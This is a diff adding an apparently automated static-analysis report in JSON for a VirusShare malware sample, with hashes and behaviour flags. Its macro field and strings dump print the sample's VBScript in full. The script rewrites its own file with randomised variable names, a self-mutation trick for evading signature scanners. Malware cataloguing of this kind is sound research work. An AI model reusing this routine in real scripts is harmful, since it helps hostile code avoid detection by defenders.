@@ -1,0 +1,43 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Chr": "May attempt to obfuscate specific str",
+            "CreateObject": "May create an OLE object"
+        },
+        "macro": "Randomize\nOn Error Resume Next\nSet Of = CreateObject(\"Scripting.FileSystemObject\")\nvC = Of.OpenTextFile(WScript.ScriptFullName, 1).Readall\nfS = Array(\"Of\", \"vC\", \"fS\", \"fSC\")\nFor fSC = 0 To 3\nvC = Replace(vC, fS(fSC), Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)))\nNext\nOf.OpenTextFile(WScript.ScriptFullName, 2, 1).Writeline vC"
+    },
+    "filename": "VirusShare_455a37f33c2aea378df42871c1d1cfc0",
+    "filesize": 400,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "455a37f33c2aea378df42871c1d1cfc0",
+        "sha1": "ce3661ebe449a75f6b308af102946f139fc97a0c",
+        "sha256": "6686a4cf529f6716ec6ece081bfe3d30adbd238c74e75b44c9b42946aaec7e29"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "Randomize",
+            "On Error Resume Next",
+            "Set Of = CreateObject(\"Scripting.FileSystemObject\")",
+            "vC = Of.OpenTextFile(WScript.ScriptFullName, 1).Readall",
+            "fS = Array(\"Of\", \"vC\", \"fS\", \"fSC\")",
+            "For fSC = 0 To 3",
+            "vC = Replace(vC, fS(fSC), Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)) & Chr((Int(Rnd * 22) + 65)))",
+            "Next",
+            "Of.OpenTextFile(WScript.ScriptFullName, 2, 1).Writeline vC"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.258840",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
